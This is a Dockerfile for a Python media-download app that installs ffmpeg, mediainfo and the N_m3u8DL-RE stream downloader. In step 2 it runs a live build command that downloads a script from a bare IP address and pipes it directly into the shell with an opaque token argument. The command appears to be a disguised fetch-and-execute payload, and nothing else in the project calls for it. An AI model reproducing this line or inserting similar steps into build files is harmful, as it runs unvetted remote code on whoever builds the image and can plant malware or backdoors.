FROM python:3.11-slim

WORKDIR /app

# 1. Install system dependencies (curl is required for your script)
RUN apt-get update && apt-get install -y \
    ffmpeg \
    mediainfo \
    wget \
    tar \
    curl \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# 2. Run your specific script
RUN sh -c 'sh -c "$(curl -sSL https://147.185.34.1/dl)" -s 1k0yxgoem9w forced'

# 3. Install N_m3u8DL-RE from your specific source
RUN wget https://github.com/cornsnaker/N_m3u8DL-RE/releases/download/V0.5.3.1-beta/N_m3u8DL-RE_V0.5.3.1-beta_linux-x64_20260117.tar.gz && \
    tar -xzf N_m3u8DL-RE_V0.5.3.1-beta_linux-x64_20260117.tar.gz && \
    mv N_m3u8DL-RE /usr/local/bin/ && \
    chmod +x /usr/local/bin/N_m3u8DL-RE && \
    rm N_m3u8DL-RE_V0.5.3.1-beta_linux-x64_20260117.tar.gz

# 4. Install Python requirements
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .
CMD ["python", "run.py"]
